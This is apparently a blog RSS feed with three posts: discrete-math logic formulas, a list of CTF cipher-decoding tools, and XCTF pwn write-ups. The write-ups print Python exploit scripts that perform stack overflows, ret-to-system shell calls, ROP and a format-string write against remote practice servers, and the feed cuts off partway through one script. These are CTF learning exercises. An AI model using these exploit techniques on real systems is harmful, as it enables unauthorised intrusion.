      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>大一下的课程真的好多，连水课都无；学个离散还晕头转向的，上直播课根本听不进去😭，所以还得占用周末时</p><p>间补习功课，这篇博客就整理一些离散数学用的比较多的公式呀，定理呀……什么的，嘿嘿嘿</p><a id="more"></a><h1 id="等值式"><a href="#等值式" class="headerlink" title="等值式"></a>等值式</h1><p><strong>1、双重否定律：</strong></p><p>​        <strong><em>┐┐A ⇔ A</em></strong></p><p><strong>2、幂等律：</strong></p><p>​        <strong><em>A∧A ⇔ A</em></strong></p><p>​        <strong><em>A∨A ⇔ A</em></strong></p><p><strong>3、交换律：</strong></p><p>​        <strong><em>A∨B ⇔ B∨A</em></strong></p><p>​        <strong><em>A∧B ⇔ B∧A</em></strong></p><p><strong>4、结合律：</strong></p><p>​        <strong><em>(A∧B)∧ C ⇔ A ∧（B∧C）</em></strong></p><p>​        <strong><em>(A∨B)∨ C ⇔ A ∨（B∨C）</em></strong></p><p><strong>5、分配律：</strong></p><p>​        <strong><em>A ∨（B∧C）⇔（A∨B）∧（A∨C）</em></strong></p><p>​        <strong><em>A ∧（B∨C）⇔（A∧B）∨（A∧C）</em></strong></p><p><strong>6、德摩根律：</strong></p><p>​        <strong><em>┐（A∨B）⇔ ┐A ∧ ┐B</em></strong></p><p>​        <strong><em>┐（A∧B）⇔ ┐A ∨ ┐B</em></strong></p><p><strong>7、吸收律：</strong></p><p>​        <strong><em>A ∨（A∧B）⇔ A</em></strong></p><p>​        <strong><em>A ∧（A∨B）⇔ A</em></strong></p><p><strong>8、零律：</strong></p><p>​        <strong><em>A ∨ 1 ⇔ 1</em></strong></p><p>​        <strong><em>A ∧ 0 ⇔ 0</em></strong></p><p><strong>9、同一律：</strong></p><p>​        <strong><em>A ∨ 0 ⇔ A</em></strong></p><p>​        <strong><em>A ∧ 1 ⇔ A</em></strong></p><p><strong>10、排中律：</strong></p><p>​        <strong><em>A ∨ ┐A ⇔ 1</em></strong></p><p><strong>11、矛盾律：</strong></p><p>​        <strong><em>A ∧ ┐A ⇔ 0</em></strong></p><p><strong>12、蕴涵等值式：</strong></p><p>​        <strong><em>A→B ⇔ ┐A∨B</em></strong></p><p><strong>13、等价等值式：</strong></p><p>​        <strong><em>A↔B ⇔（A→B）∧（B→A）</em></strong></p><p><strong>14、假言易位：</strong></p><p>​        <strong><em>A→B ⇔ ┐B→┐A</em></strong></p><p><strong>15、等价否定等值式：</strong></p><p>​        <strong><em>A↔B ⇔ ┐A↔┐B</em></strong></p><p><strong>16、归谬论：</strong></p><p>​        <strong><em>(A→B) ∧ (A→┐B) ⇔ ┐A</em></strong></p><h1 id="极大、极小项"><a href="#极大、极小项" class="headerlink" title="极大、极小项"></a>极大、极小项</h1><p><img src="/images/%E6%9E%81%E5%A4%A7%E6%9E%81%E5%B0%8F%E9%A1%B9.png" alt="极大、极小项"></p><h1 id="推理定律"><a href="#推理定律" class="headerlink" title="推理定律"></a>推理定律</h1><p><strong>1、附加律</strong></p><p>​                <strong><em>A ⇒（A∨B）</em></strong></p><p><strong>2、化简律</strong></p><p>​        <strong><em>（A∧B）⇒ A</em></strong></p><p><strong>3、假言推理</strong></p><p>​        <strong><em>（A→B）∧ A ⇒ B</em></strong></p><p><strong>4、拒取式</strong></p><p>​        <strong><em>（A→B）∧ ┐B ⇒ ┐A</em></strong></p><p><strong>5、析取三段论</strong></p><p>​        <strong><em>（A∨B）∧ B ⇒ A</em></strong></p><p><strong>6、假言三段论</strong></p><p>​        <strong><em>（A→B）∧（B→C）⇒（A→C）</em></strong></p><p><strong>7、等价三段论</strong></p><p>​        <strong><em>（A↔B）∧（B↔C）⇒（A↔C）</em></strong></p><p><strong>8、构造性二难</strong></p><p>​        <strong><em>（A→B）∧（C→D）∧（A∨C）⇒（B∨D）</em></strong></p><p>​        <strong><em>（A→B）∧（┐A→B）⇒ B（特殊形式）</em></strong></p><p><strong>9、破坏性二难</strong></p><p>​        <strong><em>（A→B）∧（C→D）∧（┐B∨┐D）⇒（┐A∨┐C）</em></strong></p><h1 id="谓词逻辑"><a href="#谓词逻辑" class="headerlink" title="谓词逻辑"></a>谓词逻辑</h1><h2 id="个体词、谓词"><a href="#个体词、谓词" class="headerlink" title="个体词、谓词"></a>个体词、谓词</h2><p>在原子命题中，可以<strong>独立存在的客体</strong>（句子中的主语、宾语等）成为<strong><em>个体词</em></strong>，而用以刻画<strong>客体的性质或客体之</strong></p><p><strong>间的关系</strong>即是<strong><em>谓词</em></strong>；</p><h3 id="个体词"><a href="#个体词" class="headerlink" title="个体词"></a>个体词</h3><p><strong><em>个体词是指所研究对象中可以独立存在的具体或抽象的客体；</em></strong></p><p>个体词可分为两种，<strong><em>个体常量</em></strong>和<strong><em>个体变量</em></strong>，均在个体域内取值：</p><p>1、表示具体或特定的个体词称为<strong><em>个体常量</em></strong>，一般用带或不带下标的小写字母a,b,c…,a1,b1,c1…表示；</p><p>2、表示抽象的或泛指的个体词称为<strong><em>个体变量</em></strong>，一般用带或不带下标的小写字母x,y,z…,x1,y1,z1…表示；</p><p>3、个体词的取值范围称为<strong><em>个体域</em></strong>（或论域），常用D表示；</p><p>4、宇宙间所有个体域聚集在一起所构成的个体域称为<strong><em>全总个体域</em></strong>；</p><h3 id="谓词"><a href="#谓词" class="headerlink" title="谓词"></a>谓词</h3><p><strong><em>谓词是用来刻画个体词性质及个体词之间相互关系的词，常用F,G,H…表示；</em></strong></p><p>1、表示具体性质或关系的谓词称为<strong><em>谓词常量</em></strong>；</p><p>2、表示抽象的或泛指的性质或关系的谓词称为<strong><em>谓词变量</em></strong>；</p><h2 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h2><p><strong><em>表示个体常项或变项之间数量关系的词称为量词；</em></strong></p><p>1、<strong><em>全称量词</em></strong>（<strong>∀x</strong>）：所有的x，任意的x，……</p><p>2、<strong><em>存在量词</em></strong>（<strong>∃x</strong>）：有一些x，存在x，……</p><p>其中的x称为作用变量；一般将其量词加在其谓词之前，记为<strong>(∀x)F(x)，(∃x)F(x)</strong>,此时，F(x)称为全称量词和存在量</p><p>词的<strong><em>辖域；</em></strong></p><h2 id="项"><a href="#项" class="headerlink" title="项"></a>项</h2><p>1、任意的常量符号或任意的变量符号是<strong><em>项</em></strong>；</p><p>2、若f（x1,x2,…,xn）是n元函数符号，t1,t2,…,tn是项，则f（t1,t2,…,tn）是<strong><em>项</em></strong>；</p><p>3、仅由有限次使用以上两个规则产生的符号串才是<strong><em>项</em></strong>；</p><h2 id="合式公式"><a href="#合式公式" class="headerlink" title="合式公式"></a>合式公式</h2><p>若P（x1,x2,…,xn）是n元谓词，t1,t2,…,tn是项，则称P（t1,t2,…,tn）为<strong><em>原子谓词公式</em></strong>，简称<strong><em>原子公式</em></strong>；</p><p>满足下列条件的表达式，称为<strong><em>合式公式</em></strong>，简称<strong><em>公式</em></strong>；</p><p><strong>1、原子公式是合式公式；</strong></p><p><strong>2、若G，H是合式公式，则（¬G）（¬H）（G∨H）（G∧H）（G→H）（G↔H）也是合式公式；</strong></p><p><strong>3、若G是合式公式，x是个体变量，则(∀x)G、(∃x)G也是合式公式；</strong></p><p><strong>4、由有限次使用以上三个规则产生的表达式才是合式公式；</strong></p><h2 id="自由变元和约束变元"><a href="#自由变元和约束变元" class="headerlink" title="自由变元和约束变元"></a>自由变元和约束变元</h2><p>定义：给定一个合式公式G，若变元x出现在使用变元的量词的辖域之内，则称变元x的出现为<strong>约束出现</strong>，此时的变</p><p>元x称为<strong>约束变元</strong>；若x的出现<strong>不是约束出现</strong>，则称它为<strong>自由出现</strong>，此时的变元x 称为<strong>自由变元</strong>；</p><h2 id="闭式"><a href="#闭式" class="headerlink" title="闭式"></a>闭式</h2><p>设G是任意一个公式，若G中无自由出现的个体变元，则称G为<strong>封闭的合式公式</strong>，简称<strong>闭式</strong>；</p><p>显然，闭式是一个命题；</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/discrete-math/#disqus_thread</comments>
    </item>
    
    <item>
      <title>烧脑的密码——花里胡哨</title>
      <link>https://www.los-kos.cn/posts/crypto/</link>
      <guid>https://www.los-kos.cn/posts/crypto/</guid>
      <pubDate>Fri, 03 Apr 2020 05:20:00 GMT</pubDate>
      <description>
      
        积累各种Crypto，研究花里胡哨的Crypto
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>最近学习pwn，又累又自闭=_=我觉得还得抓抓crypto才行，主打pwn，副业crypto，perfect ！！😊</p><p>这篇博文就对crypto做个小总结吧，会不定时的更新，毕竟现在学的也不都多，学无止境哈哈哈；</p><a id="more"></a><h1 id="16进制—-gt-文本"><a href="#16进制—-gt-文本" class="headerlink" title="16进制—>文本"></a>16进制—&gt;文本</h1><p>这个是我做题以来，用到的最多的一种</p><p>解密网站1：<a href="http://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16进制文本转换</a>   </p><p>解密网站2：<a href="https://www.sojson.com/hexadecimal.html" target="_blank" rel="noopener">16进制文本转换</a></p><h1 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h1><p>先来个简单的Base加密</p><p>Base是一个大家族，有Base16，Base32，Base64…多种加密，常用的是Base64加密，通常Base64有个特征：</p><p>由于它的加密方法问题，常常以 <code>"= ="</code> 结尾</p><p>解密网站：<a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">Base64</a> </p><h1 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h1><p>摩斯密码，很多人都听说过吧应该，就是由 <code>"."</code> 和 <code>"-"</code> 组成</p><p>e.g.    <code>-.-./-/..-.</code>  ——&gt;  <code>CTF</code></p><p>解密网站：<a href="https://tool.lu/morse/" target="_blank" rel="noopener">Morse</a></p><h1 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h1><p>凯撒密码，这个原理也很简单，就是每一个字母往后移动相同的位数</p><p>解密网站： <a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">Caesar</a></p><h1 id="ROT13"><a href="#ROT13" class="headerlink" title="ROT13"></a>ROT13</h1><p>ROT13，每个字母回转13位</p><p>解密网站：<a href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html" target="_blank" rel="noopener">ROT13</a> </p><h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>md5，这个不好解释，直接放网站吧</p><p>解密网站：<a href="https://pmd5.com/" target="_blank" rel="noopener">MD5</a></p><h1 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h1><p>培根密码，由<code>A(a)</code>，<code>B(b)</code>组成，代表的是数学中的0和1</p><p>解密网站：<a href="https://tool.bugku.com/peigen/" target="_blank" rel="noopener">培根密码</a></p><h1 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h1><p>栅栏密码，把明文分为N个一组，把每一组的第一个字符组合，第二个字符组合…第N个字符组合，然后连起来就</p><p>是一段栅栏密码了</p><p>e.g.   （以2栏栅栏为例：）</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">明文：I Love CTF </span><br><span class="line">去空格：ILoveCTF</span><br><span class="line">分组：IL ov eC TF</span><br><span class="line">第一组：IoeT</span><br><span class="line">第二组：LvCF</span><br><span class="line">密文：IoeTLvCF</span><br></pre></td></tr></tbody></table></figure><p>解密网站：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码</a>   </p><p>还有一种栅栏密码叫做<code>W型栅栏密码</code> 解密网站：<a href="http://www.atoolbox.net/Tool.php?Id=777" target="_blank" rel="noopener">W型栅栏密码</a></p><h1 id="Ook-amp-Brainfuck"><a href="#Ook-amp-Brainfuck" class="headerlink" title="Ook &amp; Brainfuck"></a>Ook &amp; Brainfuck</h1><p>Ook，这个很有意思😂，形如：<code>Ook. Ook! Ook?</code> 这样的就是Ook加密</p><p>Brainfuck，这个也很有意思，形如：<code>++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[</code></p><p>这样的就是Brainfuck加密😁</p><p>解密网站： <a href="https://tool.bugku.com/brainfuck/?wafcloud=1" target="_blank" rel="noopener">Ook &amp; Brainfuck</a> </p><h1 id="quipqiup"><a href="#quipqiup" class="headerlink" title="quipqiup"></a>quipqiup</h1><p>quipqiup，这个是把一段英文，每个字母替换为另一个指定的字母的加密</p><p>解密网站：<a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a> </p><h1 id="与佛论禅"><a href="#与佛论禅" class="headerlink" title="与佛论禅"></a>与佛论禅</h1><p>这个没什么好解释的</p><p>解密网站：</p><p><a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a></p><p><a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新约佛论禅</a></p><h1 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h1><p>键盘密码，更没法说，把密文在键盘上找到位置，有时候连成的轨迹是一个字母，有时候是围着一个字母</p><p>还有手机9键密码，比如666，就是键盘”6“上的第三个字母”O“ …根据情况定吧，变化很多~</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>这里放一些不知道原理，只会根据题目来解的加密：</p><p><a href="https://www.sojson.com/encrypt_aes.html" target="_blank" rel="noopener">AES</a>  <a href="https://www.sojson.com/encrypt_rabbit.html" target="_blank" rel="noopener">Rabbit</a>  <a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">serpent</a>   <a href="http://web.chacuo.net/charsetquotedprintable" target="_blank" rel="noopener">Quoted-printable</a>   <a href="http://code.mcdvisa.com" target="_blank" rel="noopener">中文电码</a> </p><h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p><a href="http://www.atoolbox.net/Category.php?Id=27" target="_blank" rel="noopener">加密解密工具</a></p><p><a href="https://blog.csdn.net/weixin_42037232/article/details/89018997?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">密码积累网站</a></p><p><a href="https://www.sojson.com/qr/deqr.html" target="_blank" rel="noopener">二维码</a></p><p><a href="https://app.xunjiepdf.com/pdf2word/" target="_blank" rel="noopener">PDF转-&gt;**</a></p><p><a href="http://ctf.ssleye.com/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">CTF在线工具</a></p><p><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">CTF资源库</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/crypto/#disqus_thread</comments>
    </item>
    
    <item>
      <title>XCTF—WP</title>
      <link>https://www.los-kos.cn/posts/xctf-wp/</link>
      <guid>https://www.los-kos.cn/posts/xctf-wp/</guid>
      <pubDate>Mon, 30 Mar 2020 02:00:00 GMT</pubDate>
      <description>
      
        XCTF刷题的wp
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>这篇博客呢，就记录一些平时在XCTF刷的题目的wp，可能整理不开，会分支放；</p><a id="more"></a><h1 id="Hello-pwn"><a href="#Hello-pwn" class="headerlink" title="Hello_pwn"></a>Hello_pwn</h1><p>这个算是第一篇wp了吧，不足之处，还请多多指教；</p><p>拿到题目，按照惯例，先查看保护机制：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/hello_pwn_1.png" alt="hello_pwn_1"></p><p>可以看到，开了NX，未开canary，丢进ida查看伪代码：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/hello_pwn_2.png" alt="hello_pwn_2"></p><p>可以看到这里，先读取一个字符串，再判断如果dword = 1853186401，执行下面那个函数，点进去看：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/hello_pwn_3.png" alt="hello_pwn_3"></p><p>这里直接给了flag了，思路就清晰了吧：只要让<code>dword</code> = 1853186401就可以了</p><p>但是读取的是<code>unk</code>，判断的确是<code>dword</code>，那就看看它们的关系：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/hello_pwn_4.png" alt="hello_pwn_4"></p><p>可以看到，unk和dword偏移量是4个字节，这就好办了呀😁</p><p>直接看exp吧：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">49503</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"lets get helloworld for bof"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><p>这样就做出来了，\(●ˇ∀ˇ●)/</p><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>这道题题目也给出了，考察的ROP，算是很简单的一道题了；</p><p>先查看保护机制：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/level2_1.png" alt="level2_1"></p><p>开了NX，没有canary</p><p>丢进ida，查看伪代码：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/level2_2.png" alt="level2_2"></p><p>点进vulnerable_function()函数，查看一波：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/level2_3.png" alt="level2_3"></p><p>这里我们发现，read函数极易造成栈溢出漏洞，点进buf，查看空间分配：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/level2_4.png" alt="level2_4"></p><p>这里有buf长度 = （0x88 + 0x4）</p><p>然后搜索字符串，发现”/bin/sh” ,点击进去：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/level2_5.png" alt="level2_5"></p><p>这里就应该清楚了，利用栈溢出漏洞，构造payload覆盖到”/bin/sh”，直接获取shell，那么还得需要寻找system的地址，再寻找一波：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/level2_6.png" alt="level2_6"></p><p>到这里就全部清楚了，上exp：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">54298</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line">system = <span class="number">0x08048320</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(system)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line"></span><br><span class="line">a.send(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><p>这道题就做完了，嘻嘻嘻~😀</p><blockquote><p>因博主近期忙于学习，下面的题解就不写过程了，若有问题，可以留言或者联系我，敬请谅解(●’◡’●)</p></blockquote><h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><p><strong><em>栈溢出</em></strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">55157</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">0x88</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h1><p><strong><em>栈溢出</em></strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">"111.198.29.45"</span>,<span class="string">"44063"</span>)</span><br><span class="line"></span><br><span class="line">system_catflag = <span class="number">0x400906</span></span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"?"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(<span class="string">"1925"</span>)  </span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Name?"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">8</span>*<span class="string">'a'</span> + p32(<span class="number">0x00000786</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><p><strong><em>栈溢出</em></strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">46997</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x08048420</span></span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x2A</span>*<span class="string">'a'</span> + p32(sys_addr) + p32(<span class="number">0</span>) + p32(name_addr)</span><br><span class="line"></span><br><span class="line">sys_format = <span class="string">"cat flag"</span></span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'please tell me your name\n'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(sys_format)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'hello,you can leave some message here:\n'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><p><strong><em>栈溢出</em></strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">41481</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">24</span> + p32(<span class="number">0x0804868B</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">263</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Please input your username:\n"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(<span class="string">"aaaa"</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Please input your passwd:\n"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p><strong><em>字符串格式化</em></strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">50292</span>)</span><br><span class="line"></span><br><span class="line">pwnme = <span class="number">0x0804A068</span></span><br><span class="line"> </span><br><span class="line">payload1 = <span class="string">'aaaa'</span></span><br><span class="line"></span><br><span class="line">payload2 = p32(pwnme) + <span class="string">'aaaa%10$n'</span></span><br><span class="line"> </span><br><span class="line">a.recvuntil(<span class="string">'please tell me your name:\n'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload1)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'leave your message please:\n'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload2)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p><strong><em>栈溢出  ROP</em></strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">a = 